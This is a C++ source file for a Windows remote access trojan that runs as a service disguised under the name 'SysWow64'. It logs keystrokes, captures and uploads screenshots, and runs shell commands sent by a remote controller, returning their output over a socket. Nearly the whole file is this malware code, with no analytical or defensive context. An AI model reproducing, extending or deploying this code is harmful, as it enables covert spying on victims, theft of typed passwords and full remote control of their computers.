/*
* @Author: amaneureka
* @Date:   2017-04-02 03:33:49
* @Last Modified by:   amaneureka
* @Last Modified time: 2017-04-13 17:53:04
*/

#include <vector>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <pthread.h>
#include <fstream>
#include <sstream>

using namespace std;

/*******************************************************************************
|                                   Includes                                   |
*******************************************************************************/

#if __WIN__

    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 -lgdiplus -lole32 -DDEBUG */

    /* supporting win 7 or later only */
    #define WINVER _WIN32_WINNT_WIN7
    #define _WIN32_WINNT _WIN32_WINNT_WIN7

    #include <windows.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    #include <gdiplus.h>

    using namespace Gdiplus;

    /* simple POSIX to windows translation */
    #define sleep Sleep
    #define read(soc, buf, len) recv(soc, buf, len, 0)
    #define write(soc, buf, len) send(soc, buf, len, 0)

#elif __LINUX__

    /* g++ -std=c++11 iirat.cpp -D__LINUX__ */

    #include <unistd.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    #include <netinet/in.h>

    "not fully supported yet"

#else

    "You forget to define platform"

#endif

/* debugger print */
#ifdef DEBUG
    #define DPRINT(...) fprintf(stdout, __VA_ARGS__)
#else
    #define DPRINT(...)
#endif

/*******************************************************************************
|                                     IIRAT                                    |
*******************************************************************************/

static bool terminated = false;
static bool logged_in = false;

/* concerned special keycodes */
char keycodes[] =
{
    VK_LBUTTON,
    VK_RBUTTON,
    VK_MBUTTON,
    VK_BACK,
    VK_TAB,
    VK_RETURN,
    VK_SHIFT,
    VK_CONTROL,
    VK_MENU,
    VK_CAPITAL,
    VK_ESCAPE,
    VK_SPACE,
    VK_PRIOR,
    VK_PRIOR,
    VK_HOME,
    VK_LEFT,
    VK_UP,
    VK_RIGHT,
    VK_DOWN,
    VK_SNAPSHOT,
    VK_INSERT,
    VK_DELETE,

    VK_NUMPAD0,
    VK_NUMPAD1,
    VK_NUMPAD2,
    VK_NUMPAD3,
    VK_NUMPAD4,
    VK_NUMPAD5,
    VK_NUMPAD6,
    VK_NUMPAD7,
    VK_NUMPAD8,
    VK_NUMPAD9,

    VK_MULTIPLY,
    VK_ADD,
    VK_SEPARATOR,
    VK_SUBTRACT,
    VK_DECIMAL,
    VK_DIVIDE
};

bool command_ack = false;
pthread_mutex_t mutex_socket;
int send_request(int socket, const char *buffer, int size, bool applylock)
{
    int status = 0, wait = 10;
    DPRINT("%s(): %x %d %d\n", __func__, socket, buffer, size, applylock);

    /* do we need to apply lock? */
    if (applylock) pthread_mutex_lock(&mutex_socket);

    command_ack = false;
    write(socket, buffer, size);

    while(!command_ack && wait-- > 0)
        sleep(100);

    status = command_ack == true;

    if (applylock) pthread_mutex_unlock(&mutex_socket);
    DPRINT("\tstatus: %d\n", status);
    return status;
}

void *logger(void *args)
{
    int i, index = 3, socket;
    vector<char> buf(100);

    DPRINT("%s()\n", __func__);

    socket = *(int*)args;
    sprintf(buf.data(), "SAV");
    while(true)
    {
        // maximum of 3 entries can be made in a single loop so 1020
        if (index >= 90)
        {
            DPRINT("%s(): sending data\n", __func__);

            /* send data */
            send_request(socket, buf.data(), index, true);

            /* reset buffer */
            index = 3;
        }

        for (int i = 0; i < sizeof(keycodes); i++)
        {
            /* get special key's status */
            if (GetAsyncKeyState(keycodes[i]))
                buf[index++] = i;
        }

        for (int i = 0x41; i < 0x5B; i++)
        {
            /* get alphabets */
            if (GetAsyncKeyState(i))
                buf[index++] = i;
        }

        for (int i = 0x30; i < 0x3A; i++)
        {
            /* get numeric keys */
            if (GetAsyncKeyState(i))
                buf[index++] = i;
        }

        sleep(100);
    }
}

void register_device(int socket, string recv_uid)
{
    ifstream infile;
    ofstream outfile;
    char filename[] = ".socket";

    DPRINT("%s()\n", __func__);

    if (recv_uid.size())
    {
        remove(filename);
        outfile.open(filename);
        outfile << recv_uid;
        outfile.close();
    }

    infile.open(filename);

    if (!infile)
    {
        DPRINT("%s(): file not found!\n", __func__);
        write(socket, "REG", 4);
        return;
    }

    string uid;
    infile >> uid;
    infile.close();

    uid = "LOG" + uid;
    DPRINT("%s(): %s\n", __func__, uid.c_str());

    write(socket, uid.c_str(), uid.size());
}

struct cmd_args
{
    int socket;
    string cmd;
};

void *execute_cmd(void* arguments)
{
    int len;
    FILE *pPipe;
    vector<char> buf(150);
    struct cmd_args *args;

    args = (struct cmd_args *)arguments;
    DPRINT("%s()\n", __func__);

    fflush(stdin);
    pPipe = popen(args->cmd.c_str(), "r");
    if (pPipe == NULL)
    {
        DPRINT("%s(): pipe creation failed!\n", __func__);

        sprintf(buf.data(), "RSP%07dFailed to create pipe!", 0);
        send_request(args->socket, buf.data(), strlen(buf.data()), true);
        return NULL;
    }

    /* we want this data to be contigous */

    string str;
    while(fgets(buf.data(), 128, pPipe))
    {
        str = buf.data();
        len = (int)str.size() + 10;
        sprintf(buf.data(), "RSP%07d%s", len, str.c_str());
        // send request failed
        if (!send_request(args->socket, buf.data(), len, true)) break;
    }

    DPRINT("%s(): %d\n", __func__, feof(pPipe));
    pclose(pPipe);
    return NULL;
}

/* https://msdn.microsoft.com/en-us/library/windows/desktop/ms533843(v=vs.85).aspx */
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT num = 0;
    UINT size = 0;

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    GetImageEncoders(num, size, pImageCodecInfo);

    for(UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

void *get_screenshot(void* arguments)
{
    CLSID clsid;
    ULONG quality;
    int width, height;
    HDC screenDC, memDC;
    struct cmd_args *args;
    HBITMAP memBit, oldbit;
    ULONG_PTR gdiplusToken;
    EncoderParameters encoderParameters;
    GdiplusStartupInput gdiplusStartupInput;

    args = (struct cmd_args *)arguments;
    DPRINT("%s()\n", __func__);

    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    screenDC = GetDC(NULL);
    memDC = CreateCompatibleDC(screenDC);
    memBit = CreateCompatibleBitmap(screenDC, width, height);

    oldbit = (HBITMAP)SelectObject(memDC, memBit);
    BitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);

    Bitmap bitmap(memBit, NULL);
    GetEncoderClsid(L"image/jpeg", &clsid);

    quality = 20;
    encoderParameters.Count = 1;
    encoderParameters.Parameter[0].Guid = EncoderQuality;
    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParameters.Parameter[0].NumberOfValues = 1;
    encoderParameters.Parameter[0].Value = &quality;

    IStream *pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    bitmap.Save(pStream, &clsid, &encoderParameters);

    STATSTG stg = {};
    ULARGE_INTEGER pos = {};
    LARGE_INTEGER liZero = {};

    pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
    pStream->Stat(&stg, STATFLAG_NONAME);

    ULONG bytesRead = 0;
    vector<char> buf(1024);

    int size2read = stg.cbSize.LowPart;
    sprintf(buf.data(), "RSP%07d", size2read + 10);

    DPRINT("%s(): %d\n", __func__, size2read);

    /* we want this data to be contigous */

    // lock socket write stream
    pthread_mutex_lock(&mutex_socket);

    send_request(args->socket, buf.data(), strlen(buf.data()), false);
    for (int i = 0; i < size2read; i += 1000)
    {
        pStream->Read(buf.data(), 1000, &bytesRead);
        send_request(args->socket, buf.data(), bytesRead, false);
    }

    // unlock socket write stream
    pthread_mutex_unlock(&mutex_socket);
    return NULL;
}

int run(const char* remote_addr, int port)
{
    int sock, len;
    string cmd, req;
    vector<char> buffer(1030);
    struct sockaddr_in addr;
    struct cmd_args cmdargs;
    fd_set active_fd_set, read_fd_set;

    pthread_t logger_thread, cmd_thread;

    // reset flag
    terminated = false;

    /* create socket */
    sock = socket(AF_INET , SOCK_STREAM , 0);
    if (sock < 0)
    {
        DPRINT("%s(): could not create socket\n", __func__);
        return -1;
    }

    /* configurations */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, remote_addr, &addr.sin_addr) <= 0)
    {
        DPRINT("%s(): address resolve failed\n", __func__);
        return -1;
    }

    /* try to connect */
    if (connect(sock, (struct sockaddr *)&addr , sizeof(addr)) < 0)
    {
        DPRINT("%s(): unable to connect\n", __func__);
        return -1;
    }

    DPRINT("%s(): server connected\n", __func__);

    /* add client and stdin to read list */
    FD_ZERO(&active_fd_set);
    FD_SET(sock, &active_fd_set);

    /* start background tasks */
    pthread_mutex_init(&mutex_socket, NULL);
    pthread_create(&logger_thread, NULL, &logger, &sock);

    while(!terminated)
    {
        read_fd_set = active_fd_set;

        if (select(FD_SETSIZE, &read_fd_set, NULL, NULL, NULL) < 0)
        {
            DPRINT("%s(): select error\n", __func__);
            return -1;
        }

        for (int i = 0; i < FD_SETSIZE; i++)
        {
            if (FD_ISSET(i, &read_fd_set))
            {
                if (i == sock)
                {
                    if ((len = read(sock, buffer.data(), buffer.size())) <= 0)
                    {
                        DPRINT("%s(): disconnected from the server\n", __func__);
                        return -1;
                    }

                    // null termination
                    buffer[len] = 0;

                    cmd = buffer.data();
                    req = cmd.substr(0, 3);

                    if (req == "UID")
                    {
                        DPRINT("%s(): [UID] key=\'%s\'\n", __func__, cmd.substr(3).c_str());

                        /* change current state */
                        logged_in = false;

                        /* save new uid and login again */
                        register_device(sock, cmd.substr(3));
                    }
                    else if (req == "HLO")
                    {
                        DPRINT("%s(): [HLO] Hello!\n", __func__);

                        /* login successful */
                        logged_in = true;
                    }
                    else if (req == "INV")
                    {
                        DPRINT("%s(): [INV] Invalid!\n", __func__);

                        remove(".socket");

                        /* invalid command */
                        logged_in = false;

                        /* try to login again */
                        register_device(sock, "");
                    }
                    else if (req == "IDY")
                    {
                        DPRINT("%s(): [IDY] Identify\n", __func__);

                        /* session flushed */
                        logged_in = false;

                        /* try to login again */
                        register_device(sock, "");
                    }
                    else if (req == "CMD")
                    {
                        DPRINT("%s(): [CMD] \'%s\'\n", __func__, req.c_str());

                        req = cmd.substr(3, 4);

                        if (pthread_cancel(cmd_thread))
                            DPRINT("%s(): failed to kill thread\n", __func__);

                        cmdargs.socket = sock;
                        cmdargs.cmd = cmd.substr(7);
                        pthread_mutex_unlock(&mutex_socket);

                        if (req == "SSCR")
                            /* get screenshot */
                            pthread_create(&cmd_thread, NULL, &get_screenshot, &cmdargs);

                        else if (req == "EXEC")
                            /* command to execute */
                            pthread_create(&cmd_thread, NULL, &execute_cmd, &cmdargs);

                        else if (req == "TERM")

                            terminated = true;

                    }
                    else if (req == "ACK")
                    {
                        /* set ack status flag */
                        command_ack = true;
                    }
                }
            }
        }
    }

    return 0;
}


/*******************************************************************************
|                                Service Control                               |
*******************************************************************************/

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hServiceStatus;

void ControlHandler(DWORD request)
{
    switch(request)
    {
        case SERVICE_CONTROL_STOP:
            terminated = true;
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hServiceStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            terminated = true;
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hServiceStatus, &ServiceStatus);
            return;

        default:
            break;
    }
    SetServiceStatus(hServiceStatus,  &ServiceStatus);
}

void ServiceMain(int argc, char *argv[])
{
    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP |
                                       SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    hServiceStatus = RegisterServiceCtrlHandler("SysWow64", (LPHANDLER_FUNCTION) ControlHandler);
    if (hServiceStatus == (SERVICE_STATUS_HANDLE) 0) return;

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hServiceStatus, &ServiceStatus);

    #ifdef DEBUG
        freopen(".SysWow64.log", "a", stdout);
    #endif

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        run("0.0.0.0", 9124);
        Sleep(5000);
    }
}

int main(int argc, char *argv[])
{
    #ifdef DEBUG
        if (argc > 1 && strcmp(argv[1], "app") == 0)
            return run(argv[2], stoi(argv[3]));
    #endif

    SERVICE_TABLE_ENTRY serviceTable[2];
    serviceTable[0].lpServiceName = "SysWow64";
    serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    serviceTable[1].lpServiceName = NULL;
    serviceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(serviceTable);
    return 0;
}
